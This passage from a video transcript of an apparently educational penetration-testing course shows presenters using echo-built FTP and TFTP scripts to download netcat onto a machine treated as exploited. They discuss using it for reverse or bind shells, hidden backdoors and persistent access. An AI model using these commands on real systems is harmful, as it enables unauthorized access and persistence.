actually on this machine because\nit's my test machine so it is there, but\n\n268\n00:13:01.802 --> 00:13:04.029\nwe're going to pretend\nthat's not the case.\n\n269\n00:13:04.029 --> 00:13:06.591\nThis is just your run of\nthe mill server out in the wild.\n\n270\n00:13:06.591 --> 00:13:10.306\nIt was running a vulnerable service\nwe exploited it and got a shell,\n\n271\n00:13:10.306 --> 00:13:13.310\nwe created a user and\nnow we've set the stage.\n\n272\n00:13:13.310 --> 00:13:17.600\nNetcat is not here, we want to upload\nnetcat so we can use netcat for\n\n273\n00:13:17.600 --> 00:13:18.780\nour reasons later.\n\n274\n00:13:18.780 --> 00:13:20.590\nCreate maybe reverse shell,\nbind shell, whatever.\n\n275\n00:13:22.160 --> 00:13:25.243\nSo what are we gonna do to do that?\n\n276\n00:13:25.243 --> 00:13:26.828\nWell, we're going to create that file.\n\n277\n00:13:26.828 --> 00:13:31.480\nLet me show you,\nif I do ftp-- help, like so.\n\n278\n00:13:31.480 --> 00:13:35.983\nYou'll see you get all these cool\noptions for your FTP [INAUDIBLE],\n\n279\n00:13:35.983 --> 00:13:40.430\njust typing your FTP is not the extent\nof it you need a little more.\n\n280\n00:13:40.430 --> 00:13:44.490\nOptions we're gonna need is -v,\nright here.\n\n281\n00:13:44.490 --> 00:13:47.550\nSuppresses display of\nremote server responses.\n\n282\n00:13:47.550 --> 00:13:51.310\nWhich is weird to me because\ntypically -v is for verbosity.\n\n283\n00:13:51.310 --> 00:13:54.680\nShow me the things that\nthe server is saying.\n\n284\n00:13:54.680 --> 00:13:57.450\nBut for here they've used -v,\nit suppresses them.\n\n285\n00:13:57.450 --> 00:13:59.458\nGo figure on that one,\nI just thought that was interesting.\n\n286\n00:13:59.458 --> 00:14:04.520\n-n, suppress auto-Login\nupon initial connection.\n\n287\n00:14:04.520 --> 00:14:05.800\nVery important.\n\n288\n00:14:05.800 --> 00:14:06.610\nWe will need that.\n\n289\n00:14:06.610 --> 00:14:09.250\nWe don't want it trying\nto login as hacker,\n\n290\n00:14:09.250 --> 00:14:13.770\nbecause hacker is not a legitimate\nuser on my FTP service.\n\n291\n00:14:13.770 --> 00:14:16.270\nSo I don't want it to\ntry to login as hacker.\n\n292\n00:14:16.270 --> 00:14:19.760\nI want it to take a prompt for a user.\n\n293\n00:14:19.760 --> 00:14:21.480\nAnd we feed it what user I want it to use.\n\n294\n00:14:22.740 --> 00:14:27.680\nAnd then the third option we will\nuse here is this -s file name.\n\n295\n00:14:27.680 --> 00:14:30.440\nAnd this is the best part right here.\n\n296\n00:14:30.440 --> 00:14:33.940\nSpecifies a text file\ncontaining FTP commands.\n\n297\n00:14:33.940 --> 00:14:36.280\nThe commands will automatically\nrun after FTP starts.\n\n298\n00:14:36.280 --> 00:14:38.470\nWell isn't that just a dandy little thing?\n\n299\n00:14:38.470 --> 00:14:42.310\nThank you FTP client,\nwe will use that to our advantage.\n\n300\n00:14:42.310 --> 00:14:43.450\nAll right, so that being said.\n\n301\n00:14:44.840 --> 00:14:45.820\nLet's start this gig.\n\n302\n00:14:45.820 --> 00:14:49.510\nThere's a cool little thing that's\nfound on most OSs called Echo.\n\n303\n00:14:49.510 --> 00:14:54.000\nIf you say Echo hello it'll just\nprint hello to the output screen.\n\n304\n00:14:54.000 --> 00:14:58.400\nBut we can also redirect that\noutput into the input of a file.\n\n305\n00:14:59.790 --> 00:15:04.140\nAnd since FTP allows me\nto use a file as input\n\n306\n00:15:04.140 --> 00:15:06.060\nyou probably are catching my drift here.\n\n307\n00:15:06.060 --> 00:15:07.394\nYou're seeing where we're going with it.\n\n308\n00:15:07.394 --> 00:15:09.331\nWe're gonna create a file that\nhas a bunch of FTP commands.\n\n309\n00:15:09.331 --> 00:15:12.645\nAnd because I can't use\nsomething interactive like Edit.\n\n310\n00:15:12.645 --> 00:15:16.560\nI can't jump open Notepad and\nhave it open up.\n\n311\n00:15:16.560 --> 00:15:20.906\nThere's nothing cool,\nlike what we have in Linux.\n\n312\n00:15:20.906 --> 00:15:23.576\nWhere there's command line editors and\nthings of that nature.\n\n313\n00:15:23.576 --> 00:15:25.777\nThere's one that's Edit, but\nit doesn't work, I tried it.\n\n314\n00:15:25.777 --> 00:15:30.447\n&gt;&gt; [LAUGH]\n&gt;&gt; It goes weird.\n\n315\n00:15:30.447 --> 00:15:36.440\nSo, that being the case I have to Echo\nthings into the input of a file and\n\n316\n00:15:36.440 --> 00:15:40.780\nthen append that file continually until\nI have built the file that I need.\n\n317\n00:15:40.780 --> 00:15:41.770\nSo that's what we're gonna do.\n\n318\n00:15:42.990 --> 00:15:43.630\nWe'll use Echo.\n\n319\n00:15:43.630 --> 00:15:45.130\nSo Echo will start here.\n\n320\n00:15:45.130 --> 00:15:51.498\nOpen and this is our standard FTP\ncommands you'll see is very simple here.\n\n321\n00:15:51.498 --> 00:15:59.684\nAnd we're going to open to my\nFTP server 192.168.219.146.\n\n322\n00:15:59.684 --> 00:16:03.512\nYou can add the port number if you\nwould like, if you scan the box and Or\n\n323\n00:16:03.512 --> 00:16:06.551\nyou're running your FTP server\non a different port for\n\n324\n00:16:06.551 --> 00:16:10.940\nwhatever reason, maybe security\nthrough obscurity kind of thing.\n\n325\n00:16:10.940 --> 00:16:12.530\nThat's fine,\njust add the port right there.\n\n326\n00:16:12.530 --> 00:16:14.140\nI'll put 21 and\njust leave it for you guys.\n\n327\n00:16:14.140 --> 00:16:18.860\nAnd if you use a single greater than,\nbe careful doing this.\n\n328\n00:16:18.860 --> 00:16:23.790\nIf you use a single greater than,\nthat writes to the file.\n\n329\n00:16:23.790 --> 00:16:25.040\nIf there's anything in that file,\n\n330\n00:16:25.040 --> 00:16:28.110\nit writes over that file and\nsays this is what goes in there, right.\n\n331\n00:16:28.110 --> 00:16:32.270\nAfter this we're going to append to\nthe file, using two greater than signs,\n\n332\n00:16:32.270 --> 00:16:32.915\nall right.\n\n333\n00:16:32.915 --> 00:16:34.500\nSo keep that in mind.\n\n334\n00:16:34.500 --> 00:16:37.240\nDon't keep using the greater than singly.\n\n335\n00:16:37.240 --> 00:16:38.643\nAnd thinking you've written your file,\n\n336\n00:16:38.643 --> 00:16:41.094\nyour going to have just the last line\nof your file going to go what is this.\n\n337\n00:16:41.094 --> 00:16:41.900\n[LAUGH] Right.\n\n338\n00:16:41.900 --> 00:16:44.890\nSo the first line that\nyou need to start with,\n\n339\n00:16:44.890 --> 00:16:48.450\nyou just start the file and\nthen just name your file.\n\n340\n00:16:48.450 --> 00:16:51.390\nSo echo open, ftp 21 and then we'll\n\n341\n00:16:54.110 --> 00:16:59.220\ncall it ftp dot Txt like that.\n\n342\n00:16:59.220 --> 00:17:03.380\nI'll hit return and now I didn't\nget any errors I do a dir I now\n\n343\n00:17:03.380 --> 00:17:08.690\nhave an ftp.txt file which I did\nnot have before so that's good.\n\n344\n00:17:08.690 --> 00:17:09.850\nIt is there.\n\n345\n00:17:09.850 --> 00:17:12.150\nYou gotta kinda blindly hope that\nyou typed everything correctly so\n\n346\n00:17:12.150 --> 00:17:13.840\njust be careful as you're typing.\n\n347\n00:17:13.840 --> 00:17:16.804\nTrust me I did this like three times,\nwhy is this stupid thing not working?\n\n348\n00:17:16.804 --> 00:17:20.543\nAnd you're typing things,\nyou can't see very well what's going on,\n\n349\n00:17:20.543 --> 00:17:22.237\nit can be a little frustrating.\n\n350\n00:17:22.237 --> 00:17:25.300\nSo just be careful when you're typing.\n\n351\n00:17:25.300 --> 00:17:32.100\nAll right, let's echo user,\necho sheco, echo user, like that.\n\n352\n00:17:32.100 --> 00:17:35.832\nAnd then we're gonna give it the username,\nmy username is FTP2.\n\n353\n00:17:35.832 --> 00:17:37.240\nAnd then we're going append.\n\n354\n00:17:37.240 --> 00:17:42.291\nRemember, double greater\nthan signs to txt dot.\n\n355\n00:17:42.291 --> 00:17:45.871\nI'm sorry, FTP.txt, that's funny.\n\n356\n00:17:45.871 --> 00:17:49.170\nAnd you'll notice that I didn't\ngive a space after that.\n\n357\n00:17:49.170 --> 00:17:51.850\nI do think that that's\nimportant here because it would\n\n358\n00:17:51.850 --> 00:17:54.570\ninterpret that space as\npart of the username maybe.\n\n359\n00:17:54.570 --> 00:17:58.040\nSo what certain commands I'll space and\nsome I won't.\n\n360\n00:17:58.040 --> 00:18:00.720\nJust if it doesn't work,\ntry it again without the space and\n\n361\n00:18:00.720 --> 00:18:02.391\nmaybe you'll get a little further.\n\n362\n00:18:02.391 --> 00:18:05.372\nHere I think the username is\nvery important on that one.\n\n363\n00:18:05.372 --> 00:18:09.805\nSo ECHO user\n&gt;&gt; ftp2 Good to go, no errors.\n\n364\n00:18:09.805 --> 00:18:10.544\nEverything looks good.\n\n365\n00:18:10.544 --> 00:18:12.625\nI'm gonna echo what the password is,\n\n366\n00:18:12.625 --> 00:18:15.950\ncuz at this point it's gonna\nprompt the user for a password.\n\n367\n00:18:15.950 --> 00:18:18.300\nWe just wanna feed that through\nour little script file here.\n\n368\n00:18:19.640 --> 00:18:25.729\nAnd the super secret password is,\nI can't even type it.\n\n369\n00:18:25.729 --> 00:18:26.315\nThere we go.\n\n370\n00:18:26.315 --> 00:18:28.554\nP-a-s-s-w-0-r-d-1.\n\n371\n00:18:28.554 --> 00:18:30.043\nHit return.\n\n372\n00:18:30.043 --> 00:18:31.430\nAs you can see it just did that.\n\n373\n00:18:31.430 --> 00:18:34.600\nAnd of course I can't hit up,\nI have to actually retype everything.\n\n374\n00:18:34.600 --> 00:18:36.580\nRemember, crazy stinking terminals, right,\n\n375\n00:18:36.580 --> 00:18:38.980\nthey get shovelled it\ndoesn't work as normal.\n\n376\n00:18:38.980 --> 00:18:45.890\nSo P@ssw0rd1 and\nthen remember to append that to ftp.txt.\n\n377\n00:18:45.890 --> 00:18:47.180\nThere we go, that's gonna help out.\n\n378\n00:18:48.190 --> 00:18:52.945\nThen we're gonna echo bin, echo bin And\n\n379\n00:18:52.945 --> 00:18:58.370\nftp.txt, that's a strange name for\nthe file.\n\n380\n00:18:58.370 --> 00:19:00.710\nBin just says, change to binary\nmode if you're not there already,\n\n381\n00:19:00.710 --> 00:19:02.600\nbecause that can help in file transfers.\n\n382\n00:19:02.600 --> 00:19:05.760\nsometimes they won't allow\nit unless you've done that.\n\n383\n00:19:05.760 --> 00:19:11.820\nAnd then we'll echo the get command,\nget.nc.enc\n\n384\n00:19:11.820 --> 00:19:17.160\nWhich is our Netcat then ftp.txt.\n\n385\n00:19:17.160 --> 00:19:23.230\nAnd then we will echo bye, which is\nthe basically close the command here.\n\n386\n00:19:23.230 --> 00:19:28.140\nAnd append that to ftp.txt.\n\n387\n00:19:28.140 --> 00:19:30.317\nAll right, now we have our file created.\n\n388\n00:19:30.317 --> 00:19:32.055\nHopefully I typed everything correctly,\n\n389\n00:19:32.055 --> 00:19:34.285\notherwise we're gonna have\nto type it all over again.\n\n390\n00:19:34.285 --> 00:19:35.932\n&gt;&gt; [LAUGH]\n&gt;&gt; Which is not fun.\n\n391\n00:19:35.932 --> 00:19:37.720\n[LAUGH] And now we fire off our command.\n\n392\n00:19:37.720 --> 00:19:38.650\nRemember, it was ftp.\n\n393\n00:19:38.650 --> 00:19:45.040\nWe want a -v to suppress any input or\ntalking from the server.\n\n394\n00:19:45.040 --> 00:19:46.340\nWe don't wanna see that.\n\n395\n00:19:46.340 --> 00:19:52.160\nAnd then -n to suppress it trying\nto log in with the current user.\n\n396\n00:19:52.160 --> 00:19:52.876\nDon't want that.\n\n397\n00:19:52.876 --> 00:20:00.210\nThen -s:FTP.txt and then drumroll please.\n\n398\n00:20:00.210 --> 00:20:02.900\nOkay, good,\nlooks like everything worked correctly.\n\n399\n00:20:02.900 --> 00:20:03.810\nI have no errors.\n\n400\n00:20:03.810 --> 00:20:06.890\nI see that it said login was successful.\n\n401\n00:20:06.890 --> 00:20:08.880\nIt changed to binary mode.\n\n402\n00:20:08.880 --> 00:20:11.890\nIt got nc.exe,\nport command was successful.\n\n403\n00:20:12.910 --> 00:20:14.540\nThe transfer was complete.\n\n404\n00:20:14.540 --> 00:20:15.634\nAnd this is how many bytes it was.\n\n405\n00:20:15.634 --> 00:20:16.984\nAnd then it exited, goodbye.\n\n406\n00:20:16.984 --> 00:20:18.720\nI do a dir.\n\n407\n00:20:18.720 --> 00:20:22.340\nAnd now I have Netcat installed,\nI can move it, rename it,\n\n408\n00:20:22.340 --> 00:20:24.150\ndo whatever I want to this system and\n\n409\n00:20:24.150 --> 00:20:29.560\nstart using it as a part of maybe a script\nor a scheduled task, something like that.\n\n410\n00:20:29.560 --> 00:20:32.550\nSo that it will do something for\nme, maybe create a shell.\n\n411\n00:20:32.550 --> 00:20:35.220\nThat waits for me to connect\nto it at certain times of day.\n\n412\n00:20:35.220 --> 00:20:36.340\nThings of that nature.\n\n413\n00:20:36.340 --> 00:20:37.920\nNow I can maintain some access.\n\n414\n00:20:37.920 --> 00:20:40.650\nI can hide that somewhere\nthat might not be found.\n\n415\n00:20:40.650 --> 00:20:44.847\nI can rename that something that's not so\nobvious as nc.exe.\n\n416\n00:20:44.847 --> 00:20:46.665\nEven though that's not really descriptive,\n\n417\n00:20:46.665 --> 00:20:48.721\nbut anybody within the know\nwould know what that is.\n\n418\n00:20:48.721 --> 00:20:49.771\n&gt;&gt; Right, right.\n\n419\n00:20:49.771 --> 00:20:51.460\nAnd not too terribly difficult.\n\n420\n00:20:51.460 --> 00:20:55.040\nI mean, there were some steps we had\nto go through to get it ready and\n\n421\n00:20:55.040 --> 00:20:58.770\nGetting those commands in that text file\nis maybe not the most intuitive, but\n\n422\n00:20:58.770 --> 00:21:00.090\nonce you've done that once or twice.\n\n423\n00:21:00.090 --> 00:21:03.970\nI mean piping text into a text\nfile is pretty darn easy, and\n\n424\n00:21:03.970 --> 00:21:05.740\nyou saw how quickly we\ngot that cat over there.\n\n425\n00:21:05.740 --> 00:21:09.640\n&gt;&gt; Yeah, nothing to it as long\nas you get your syntax correct,\n\n426\n00:21:09.640 --> 00:21:10.590\neverything should work fine.\n\n427\n00:21:10.590 --> 00:21:12.880\nMake sure that your FTP server is running.\n\n428\n00:21:12.880 --> 00:21:16.090\nMake sure that your user is correct,\nfor you to type the password correct.\n\n429\n00:21:16.090 --> 00:21:18.430\nAnd everything should go gravy for you.\n\n430\n00:21:18.430 --> 00:21:21.600\nOkay now let's Windows,\nright there's the Windows world.\n\n431\n00:21:21.600 --> 00:21:24.780\nI did say I was gonna try to do the TFTP.\n\n432\n00:21:24.780 --> 00:21:27.260\nLet's give that a worldly gig,\nwhat the heck.\n\n433\n00:21:27.260 --> 00:21:33.929\nLet me fire it up the TFTP\nserver here which is ATFTP,\n\n434\n00:21:33.929 --> 00:21:40.296\nI'll bump this for you guys so\nyou can see ATFTPD,\n\n435\n00:21:40.296 --> 00:21:44.694\nthat's right, --daemon, and\n\n436\n00:21:44.694 --> 00:21:50.170\nthen what port, I want to get on port 69.\n\n437\n00:21:50.170 --> 00:21:54.690\nAnd then slash whatever the root\ndirectory I gave for this,\n\n438\n00:21:54.690 --> 00:21:58.480\nwhich was tftp/tftp so right off the root.\n\n439\n00:21:58.480 --> 00:22:02.920\nFire that up, should be going now.\n\n440\n00:22:02.920 --> 00:22:08.032\nIf I go back over to my machine,\nI should be able to say I'm gonna\n\n441\n00:22:08.032 --> 00:22:12.673\ndelete nc.exe and\nthen I'm going to try to do tftp here.\n\n442\n00:22:12.673 --> 00:22:16.872\nSo tftp-i, then the server address\n\n443\n00:22:16.872 --> 00:22:21.481\n192.168.219.1:46.\n\n444\n00:22:21.481 --> 00:22:22.150\nAnd I'm going to say, is that everything?\n\n445\n00:22:22.150 --> 00:22:23.240\nYeah then you just get.\n\n446\n00:22:23.240 --> 00:22:24.940\nI never remember if it's inline.\n\n447\n00:22:24.940 --> 00:22:27.409\nI think it is inline.\n\n448\n00:22:27.409 --> 00:22:30.749\nGet nc.exe.\n\n449\n00:22:30.749 --> 00:22:35.240\nThere you go so\nTFTP is not installed on this machine.\n\n450\n00:22:35.240 --> 00:22:36.270\nSo like I said,\n\n451\n00:22:36.270 --> 00:22:41.550\nCan't always rely on TFTPB in there even\nthough it's a whole lot easier, obviously.\n\n452\n00:22:41.550 --> 00:22:43.900\nSo if is available, use that.\n\n453\n00:22:43.900 --> 00:22:47.530\nIf not, now you know how to use\nFTP to get around that problem.\n\n454\n00:22:47.530 --> 00:22:50.080\n&gt;&gt; Fantastic, all right,\nnow we want to try to do it the other way?\n\n455\n00:22:50.080 --> 00:22:51.320\n&gt;&gt; Yeah, let's go Linux.\n\n456\n00:22:51.320 --> 00:22:54.527\nRight, so\nLinux might be the box you've exploited.\n\n457\n00:22:54.527 --> 00:22:55.064\nHow do we do that?\n\n458\n00:22:55.064 --> 00:22:59.350\nWe have to write a batch or\na script, a shell script.\n\n459\n00:22:59.350 --> 00:23:01.260\nThis isn't actually a batch script,\n\n460\n00:23:01.260 --> 00:23:06.390\nthis is a shell script just cuz it\nseemed to be a little easier for me.\n\n461\n00:23:06.390 --> 00:23:09.616\nAnd shells, the bin/sh,\n\n462\n00:23:09.616 --> 00:23:14.890\nthe old shell it might be around,\nbatch might not be the environment.\n\n463\n00:23:14.890 --> 00:23:18.670\nI know it's very ubiquitous, but\nbatch might not be the environment So\n\n464\n00:23:18.670 --> 00:23:23.050\njust going bin/sh is a little safer so\nwhich is why I used it here.\n\n465\n00:23:23.050 --> 00:23:30.860\nAll right, so let's do that, let's\nstart creating our, what's it called?\n\n466\n00:23:30.860 --> 00:23:31.360\nA script.\n&gt;&gt; [LAUGH]\n\n467\n00:23:31.360 --> 00:23:32.316\n&gt;&gt; Our shell script,\n\n468\n00:23:32.316 --> 00:23:36.099\nthis word is just not coming to my brain\ntoday, got so many things going on.\n\n469\n00:23:36.099 --> 00:23:37.564\nAll right, so let's see here,\n\n470\n00:23:37.564 --> 00:23:40.098\nI don't think I have a shell script here.\nI actually do.\n\n471\n00:23:40.098 --> 00:23:40.788\n[LAUGH] Well,\n\n472\n00:23:40.788 --> 00:23:45.880\nI'll call FTP 2, cuz there's my, I already\ndid this just for testing purposes.\n\n473\n00:23:45.880 --> 00:23:48.650\nI'll called it ftp.sh.\n\n474\n00:23:48.650 --> 00:23:53.410\nAnd I'll call this one ftp2.sh so\nwe can keep them squared away.\n\n475\n00:23:53.410 --> 00:23:54.181\n&gt;&gt; All right.\n\n476\n00:23:54.181 --> 00:23:56.641\n&gt;&gt; So what we do is we're going to\nuse Echo just like we did before.\n\n477\n00:23:56.641 --> 00:24:00.630\nAnd we're, for intense purposes,\nhere let me set the stage really quickly.\n\n478\n00:24:00.630 --> 00:24:02.242\nThis prompt right here,\n\n479\n00:24:02.242 --> 00:24:07.560\nlet's say that that is unexploited\nmachine prompts and not this local user.\n\n480\n00:24:07.560 --> 00:24:10.030\nBut the process is still the same.\n\n481\n00:24:10.030 --> 00:24:12.180\nOkay.\nSo just put it in your mind's eye,\n\n482\n00:24:12.180 --> 00:24:17.290\nwe are logged in remotely to\nan exploited machine and not normally.\n\n483\n00:24:17.290 --> 00:24:19.440\nOkay, from there,\neverything else is the same.\n\n484\n00:24:19.440 --> 00:24:22.080\nSo all you have to do is exploit\nthe machine once you get the prompt.\n\n485\n00:24:22.080 --> 00:24:24.140\nThen you start from this process, right?\n\n486\n00:24:25.410 --> 00:24:28.130\nThere we go.\nSo, now we're gonna use echo and I say put\n\n487\n00:24:29.430 --> 00:24:34.400\nthis in here it is not like that\nslash bin, slash s h put that.\n\n488\n00:24:34.400 --> 00:24:40.110\nAnd then of course I'll\nput that to ftp2.sh.\n\n489\n00:24:40.110 --> 00:24:40.730\nHere we go.\n\n490\n00:24:40.730 --> 00:24:43.785\nWe don't get the same kind of output\nthat you do in Windows but that's okay,\n\n491\n00:24:43.785 --> 00:24:45.200\nas long as we don't get the errors.\n\n492\n00:24:45.200 --> 00:24:47.830\nAnd you can always cat the file as well.\n\n493\n00:24:47.830 --> 00:24:50.445\nThat's something that is\nnot inside of Windows.\n\n494\n00:24:50.445 --> 00:24:51.860\n&gt;&gt; [LAUGH]\n&gt;&gt; So I can cat and\n\n495\n00:24:51.860 --> 00:24:53.550\nmake sure that that line\ngot written correctly.\n\n496\n00:24:53.550 --> 00:24:56.859\nIt's cat ftp2, two each.\n\n497\n00:24:56.859 --> 00:24:59.670\nAnd I can see that's the first line,\ncuz that's how you start a shell script.\n\n498\n00:25:00.760 --> 00:25:02.490\nAnd let's just crank through it here.\n\n499\n00:25:02.490 --> 00:25:07.341\nEcho, let's see here, I'm gonna\ncreate some variables, right yeah.\n\n500\n00:25:07.341 --> 00:25:11.729\nHost = 192.1, actually I'm just gonna use\n\n501\n00:25:11.729 --> 00:25:16.224\nthe local hosts here cuz\nthat's where I'm going.\n\n502\n00:25:16.224 --> 00:25:21.751\n.1 I think I do need to put some\nquotations around that single\n\n503\n00:25:21.751 --> 00:25:26.746\nquotes because of the periods\nin between the numbers and\n\n504\n00:25:26.746 --> 00:25:29.420\nthen append that to the file.\n\n505\n00:25:29.420 --> 00:25:34.255\nftp2.sh and I'll echo user equals,\n\n506\n00:25:34.255 --> 00:25:39.676\nyeah just to keep it\nall squared away ftp2,\n\n507\n00:25:39.676 --> 00:25:43.054\nappend that to ftp2.sh.\n\n508\n00:25:43.054 --> 00:25:48.010\nSo now we create a couple of variables\nwhat the host is, what the username is so\n\n509\n00:25:48.010 --> 00:25:52.910\nthat I can declare the variables instead\nof manually imputing in the stuff.\n\n510\n00:25:54.330 --> 00:26:00.020\nNow I will say echo.ftp, so\nthis is where I'm actually invoking ftp.\n\n511\n00:26:00.020 --> 00:26:03.080\nYou gotta remember I'm creating a file,\nI'm not doing it right now.\n\n512\n00:26:03.080 --> 00:26:06.864\nOnce the script runs, it will invoke ftp,\nand I gotta give it that command.\n\n513\n00:26:06.864 --> 00:26:07.788\nThat's what we're doing right this second.\n\n514\n00:26:07.788 --> 00:26:15.210\nSo ftp-v-n, and this,\nin this one, the v is verbose.\n\n515\n00:26:15.210 --> 00:26:17.010\nSo I get some output.\n\n516\n00:26:17.010 --> 00:26:19.940\nI had to use it for troubleshooting,\nit was very helpful.\n\n517\n00:26:19.940 --> 00:26:22.940\nSo if you're having trouble\nthrow that -v in there.\n\n518\n00:26:22.940 --> 00:26:26.163\nI just like it, and\nyou know me I'm verbose kind of person.\n\n519\n00:26:26.163 --> 00:26:27.370\n&gt;&gt; [LAUGH] Not you Dan.\n\n520\n00:26:27.370 --> 00:26:28.210\n&gt;&gt; Not me.\n\n521\n00:26:28.210 --> 00:26:28.950\nNo sir.\n\n522\n00:26:28.950 --> 00:26:30.470\nI never talk.\n\n523\n00:26:30.470 --> 00:26:31.675\nAs quiet as a church mouse.\n\n524\n00:26:31.675 --> 00:26:32.820\n&gt;&gt; [LAUGH]\n&gt;&gt; Let's see here,\n\n525\n00:26:32.820 --> 00:26:36.990\nand then END_SCRIPT, do this.\n\n526\n00:26:36.990 --> 00:26:41.080\nAnd this is gonna look weird, and you're\nlike, hold on man, that looks weird.\n\n527\n00:26:41.080 --> 00:26:44.640\nSo let me just show you\nwhat's going on here.\n\n528\n00:26:44.640 --> 00:26:46.820\nYou notice I started\nwith a single quote here.\n\n529\n00:26:46.820 --> 00:26:50.040\nAnd then I did to less\nthan signs END_SCRIPT and\n\n530\n00:26:50.040 --> 00:26:53.700\nthen ended my single quote and then the\ndouble greater than thing going on here.\n\n531\n00:26:53.700 --> 00:26:57.180\nLet me raise this over here so\nyou guys can see this better.\n\n532\n00:26:57.180 --> 00:26:59.415\nAnd they don't have to kill\nmy tiny head talking to you.\n\n533\n00:26:59.415 --> 00:27:01.930\n&gt;&gt; [LAUGH]\n&gt;&gt; What's happening is,\n\n534\n00:27:01.930 --> 00:27:03.440\nis I'm redirecting.\n\n535\n00:27:03.440 --> 00:27:07.210\nThis is what's called, my goodness,\nwhat's the name of this?\n\n536\n00:27:07.210 --> 00:27:10.900\nBasically what I'm doing is I can't\nthink of the actual official things for\n\n537\n00:27:10.900 --> 00:27:12.130\nthese things off the top\nof my head right now.\n\n538\n00:27:12.130 --> 00:27:15.840\nBut what I'm doing is I'm saying I'm\ngoing to input some commands and\n\n539\n00:27:15.840 --> 00:27:19.170\nyou'll know its the end of those\ncommands because I'm going to,\n\n540\n00:27:19.170 --> 00:27:21.170\nthe last thing you'll see is end script.\n\n541\n00:27:21.170 --> 00:27:22.880\nYou can make and say anything you want.\n\n542\n00:27:22.880 --> 00:27:26.312\nI'm just using end script\nbecause it's descriptive.\n\n543\n00:27:26.312 --> 00:27:28.729\nSo I'm inputting that\ninto the FTP command.\n\n544\n00:27:28.729 --> 00:27:33.401\nSo once it runs through this list of\ncommands, as soon as it sees end script,\n\n545\n00:27:33.401 --> 00:27:36.833\nit knows that it is done,\nit stops processing command,\n\n546\n00:27:36.833 --> 00:27:38.817\nit comes to the end of it, okay?\n\n547\n00:27:38.817 --> 00:27:43.608\nSo and then I'm appending that to the file\nwhich is the double greater thans,\n\n548\n00:27:43.608 --> 00:27:44.945\nremember all right.\n\n549\n00:27:44.945 --> 00:27:46.660\nSo append the file.\n\n550\n00:27:46.660 --> 00:27:48.120\nAll good, let me hit enter there.\n\n551\n00:27:48.120 --> 00:27:51.460\nEcho, what are we doing next here?\n\n552\n00:27:51.460 --> 00:27:53.888\n&gt;&gt; User.\n&gt;&gt; We're gonna do our, yup, our user.\n\n553\n00:27:53.888 --> 00:27:58.910\nUser is $USER, so\n\n554\n00:27:58.910 --> 00:28:03.875\nthere take a variable and don't\nforget our single quotes, bing, bang.\n\n555\n00:28:03.875 --> 00:28:08.120\nTo ftp2.sh,\n\n556\n00:28:08.120 --> 00:28:11.600\nthere we go.\n\n557\n00:28:11.600 --> 00:28:17.072\nAnd then we're gonna do our get command,\nso echo\n\n558\n00:28:17.072 --> 00:28:22.974\nthen our get and then whatever you\nwant to be, so this will be nc.exe.\n\n559\n00:28:24.770 --> 00:28:25.439\nLet me close that out.\n\n560\n00:28:25.439 --> 00:28:30.476\nI came out to the file ftp2.sh and\nthen we will\n\n561\n00:28:30.476 --> 00:28:35.652\necho our quick command which is bye,\nb-y-e.\n\n562\n00:28:35.652 --> 00:28:38.940\nI'm using a single quotes because it\nseemed to work a whole lot better for me.\n\n563\n00:28:38.940 --> 00:28:42.650\nI was getting some command not found\nkind of stuff when I didn't use those.\n\n564\n00:28:42.650 --> 00:28:46.068\nSo I threw those on there and\nit worked out a whole lot better.\n\n565\n00:28:46.068 --> 00:28:49.289\nAppend that to ftp2.sh.\n\n566\n00:28:49.289 --> 00:28:52.890\nAnd then we do our echo.\n\n567\n00:28:52.890 --> 00:28:54.800\nThis is where I put in\nthat end script thing.\n\n568\n00:28:55.910 --> 00:29:03.250\nSo I say END_SCRIPT, make sure I spelled\nit like I did before, looks like I did.\n\n569\n00:29:03.250 --> 00:29:09.540\nAnd then append that to ftp2.sh,\nand then I think that's it.\n\n570\n00:29:09.540 --> 00:29:10.870\nI think that's all.\n\n571\n00:29:10.870 --> 00:29:12.140\nThat looks like my script.\n\n572\n00:29:12.140 --> 00:29:15.370\nIf I'm looking at it correctly, everything\nlooks like it's supposed to look.\n\n573\n00:29:15.370 --> 00:29:18.110\nHopefully I didn't miss any characters\nthat are just not glaring me\n\n574\n00:29:18.110 --> 00:29:19.610\nin the face right now.\n\n575\n00:29:19.610 --> 00:29:23.204\nWe do have to make our\nscript executable so\n\n576\n00:29:23.204 --> 00:29:27.312\nrun your chmod+x on your script, ftp2.sh,\n\n577\n00:29:27.312 --> 00:29:33.390\nremember it's gotta be executable so\nthat you can execute it.\n\n578\n00:29:33.390 --> 00:29:34.935\nAnd then sir, fire away.\n\n579\n00:29:34.935 --> 00:29:35.760\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n580\n00:29:35.760 --> 00:29:39.768\nthen, let's make sure\nnc.exe isn't already here.\n\n581\n00:29:39.768 --> 00:29:43.230\nLs, sure, yeah, not there.\n\n582\n00:29:43.230 --> 00:29:46.062\nSo now we can fire away.\n\n583\n00:29:46.062 --> 00:29:51.520\n/stp2.sh, it's asking me for\nthe password, I can type that in.\n\n584\n00:29:51.520 --> 00:29:53.987\nP @ ssw0 rd1.\n\n585\n00:29:53.987 --> 00:29:55.290\nAnd there you go.\n\n586\n00:29:55.290 --> 00:29:56.130\nTransfer the file.\n\n587\n00:29:56.130 --> 00:30:00.500\nIf I do an ls-lanc.exe.\n\n588\n00:30:00.500 --> 00:30:03.960\nThere it is, I've now successfully\ndownloaded the file, and I just used it.\n\n589\n00:30:03.960 --> 00:30:07.610\nYou can create batch scripts or\nshell scripts as you're logged into those\n\n590\n00:30:07.610 --> 00:30:10.020\nexploited shells that\nyou've gained access to.\n\n591\n00:30:10.020 --> 00:30:16.720\nSo there you go, how to do FTP downloads\nusing a script file in Windows,\n\n592\n00:30:16.720 --> 00:30:21.010\nand how to create a shell script inside\nof Linux to do the exact same thing.\n\n593\n00:30:21.010 --> 00:30:23.829\n&gt;&gt; Well folks he wasn't lying,\nhe made file transfer fun, did he not?\n\n594\n00:30:23.829 --> 00:30:24.490\nI love it.\n\n595\n00:30:24.490 --> 00:30:28.260\nAll right Daniel,\ngreat demonstrations there.\n\n596\n00:30:28.260 --> 00:30:29.790\nOnce we have compromised the machine,\n\n597\n00:30:29.790 --> 00:30:32.550\nwhat is the next step,\nwe wanna maintain that access.\n\n598\n00:30:32.550 --> 00:30:35.040\nAnd the way you do that is to get\nsome files over there, right?\n\n599\n00:30:35.040 --> 00:30:37.450\nWe need those back door\nprograms which most likely\n\n600\n00:30:37.450 --> 00:30:41.350\ndon't reside currently on those machines,\nso we need to get them there somehow.\n\n601\n00:30:41.350 --> 00:30:42.490\nAnd now we know how.\n\n602\n00:30:42.490 --> 